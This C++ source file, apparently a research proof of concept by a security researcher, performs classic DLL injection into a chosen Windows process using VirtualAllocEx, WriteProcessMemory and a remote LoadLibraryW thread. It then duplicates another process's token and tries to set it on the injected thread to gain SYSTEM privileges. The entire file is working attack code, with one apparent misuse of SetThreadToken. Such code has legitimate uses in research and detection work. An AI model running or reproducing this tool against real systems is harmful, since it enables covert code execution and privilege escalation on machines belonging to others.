//Author: Jonathan Johnson (@jsecurity101)

#include <Windows.h>
#include <iostream>

int wmain(int argc, wchar_t* argv[])
{
    DWORD PID = wcstoul(argv[1], NULL, 10);
	DWORD PID2 = wcstoul(argv[3], NULL, 10);
    wchar_t* dllPath = argv[2];
    wchar_t fulldllPath[MAX_PATH];

    GetFullPathNameW(dllPath, MAX_PATH, fulldllPath, NULL);
    wprintf(L"[*] Full DLL Path: %s\n", fulldllPath);

	HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID);
	if (!hProcess) {
		printf("OpenProcess failed %d\n", GetLastError());
		return 1;
	}
	printf("[*] OpenProcess was successful\n");

	printf("[*] Allocating Memory\n");
	auto lpBuffer = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpBuffer == 0) {
		printf("VirtualAllocEx %d\n", GetLastError());
		return 1;
	}
	printf("[*] Memory Allocated\n");
	if (!WriteProcessMemory(hProcess, lpBuffer, fulldllPath, sizeof(fulldllPath), nullptr)) {
		printf("WriteProcessMemory failed %d\n", GetLastError());
		return 1;
	}
	printf("[*] Wrote process memory at address %llx\n", (unsigned long long)lpBuffer);

	printf("[*] Creating Remote Thread\n");
	auto hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, lpBuffer, 0, nullptr);
	if (hThread == 0) {
		printf("CreateRemoteThread failed %d\n", GetLastError());
		return 1;
	}
	printf("[*] Remote Thread Created\n");
	printf("[*] DLL Injected into ThreadID %d\n", GetThreadId(hThread));
	CloseHandle(hProcess);
	printf("[*] Setting Remote Thread To SYSTEM\n");
	HANDLE hToken;
	HANDLE hDuplicate;
	HANDLE hProcess1 = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID2);
	OpenProcessToken(hProcess1, TOKEN_DUPLICATE, &hToken);
	DuplicateToken(hToken, SecurityImpersonation, &hDuplicate);
	SetThreadToken(&hThread, hDuplicate);
	printf("[*] Thread set!\n");

	//Cleanup
	CloseHandle(hProcess1);
	CloseHandle(hToken);
	CloseHandle(hDuplicate);
	CloseHandle(hThread);
	return 0;
}
